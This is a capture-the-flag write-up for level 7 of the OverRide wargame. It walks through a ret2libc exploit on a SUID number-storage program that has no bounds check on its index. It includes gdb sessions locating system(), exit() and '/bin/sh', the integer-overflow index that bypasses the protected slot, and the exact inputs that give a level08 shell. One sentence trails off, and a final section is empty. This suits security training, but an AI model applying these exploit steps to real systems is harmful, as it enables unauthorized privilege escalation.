# Level 7

## Vulnerability

Unprotected Data Array, Ret2Libc Attack

## Context

We find a binary with owner ```level08``` and SUID.
```
level07@OverRide:~$ ls -l
-rwsr-s---+ 1 level08 users 11744 Sep 10  2016 level07
```

The program takes a number and index as input, which it stores or reads from a table.
```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 42
 Index: 1
 Completed store command successfully
Input command: read
 Index: 1
 Number at data[1] is 42
 Completed read command successfully
Input command: store
 Number: -42
 Index: 2
 Completed store command successfully
```

## Solution

### main() overview

See [dissasembly notes](https://github.com/anyashuka/Override/blob/main/level07/Ressources/disassembly_notes.md) for detailed gdb assembly breakdown.

The program erases arguments and environment variables, thus protecting against:
- passing malicious shellcode as arguments to the program
- storing malicious shellcode in environment variables

Vulnerability: no check performed on the index and unsigned int table is stored on the stack. This means we can read and store in stack memory. 

We know the following:
- the program creates a data table, where it stores numbers at indexes
- some indexes (index % 3 == 0) are protected

Our plan is to do a ret2libc attack, by overwriting the index containing EIP with a call to ```system()``` + ```exit()``` + ```"/bin/sh"```. 

1) find the address of system, exit, bin/sh
2) find table index of EIP (answer is 114)
3) index 114 is protected. Need to use maxint overflow to access
4) exploit by inputting malicious number + index to running program

Let's do step 1. 
```
level07@OverRide:~$ gdb -q level07

(gdb) b*main
Breakpoint 1 at 0x8048723
(gdb) run
[...]

(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>

(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"
```
Ok, here are our addresses:

- ```system()``` is at 0xf7e6aed0
- ```exit()``` is at 0xf7e5eb70
- ```"/bin/sh"``` is at 0xf7f897ec Note: we will flip these for little endian!

Let's do step 2. 
We need to find the index in the table where we reach EIP, and then store our payload there using ```store_number()```. 

The table's address is 

EIP's return address in the ```main()``` function is ```0xffffd6bc```.
```
(gdb) info frame
Stack level 0, frame at 0xffffd6c0:
 eip = 0x8048723 in main; saved eip 0xf7e45513
 Arglist at unknown address.
 Locals at unknown address, Previous frame's sp is 0xffffd6c0
 Saved registers:
  eip at 0xffffd6bc
```

We're going to write our payload at the address of EIP. 
```
[ address of EIP ] = [ address of system ] [ address of exit ] [ address of "/bin/sh" ]
   0xffffd6bc           0xf7e6aed0           0xf7e5eb70             0xf7f897ec
```











### Build exploit

```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
```

## Recreate Exploited Binary


